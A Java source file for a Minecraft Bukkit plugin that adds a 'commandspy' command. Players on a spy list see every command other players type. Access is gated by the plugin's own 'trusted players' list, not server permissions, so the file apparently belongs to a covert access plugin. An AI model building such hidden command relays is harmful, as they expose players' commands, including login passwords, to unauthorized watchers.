package de.Garkolym.Commands.Server;

import java.util.ArrayList;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import de.Garkolym.Start;
import de.Garkolym.Commands.Command;
import de.Garkolym.Commands.CommandCategory;
import net.md_5.bungee.api.ChatColor;

public class CommandCommandSpy extends Command implements Listener{

	public static ArrayList<Player> CommandSpySpieler = new ArrayList<Player>();
	
	public CommandCommandSpy() {
		super("commandspy", "Zeigt welche Befehle ausgeführt werden!", CommandCategory.SERVER);
		// TODO Auto-generated constructor stub
	}
	@Override
	public void onCommand(Player p, ArrayList<String> args) {		
		
		if(!CommandSpySpieler.contains(p))
		{
			CommandSpySpieler.add(p);
			p.sendMessage(Start.instance.prefix + "§cDu hast nun CommandSpy!");
		}
		else
		{
			CommandSpySpieler.remove(p);
			p.sendMessage(Start.instance.prefix + "§cDu hast jetzt Keinen CommandSpy mehr!");
		}
		
	}
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e)
	{
		for(Player user : CommandSpySpieler)
		{
			if((!e.getPlayer().equals(user)) && (Start.instance.getTrustedPlayers().contains(user)))
			{
				user.sendMessage(ChatColor.DARK_GREEN + "[" + ChatColor.RED + e.getPlayer().getName() + ChatColor.DARK_GREEN + "] " + ChatColor.LIGHT_PURPLE + e.getMessage());
			}
		}
	}

}
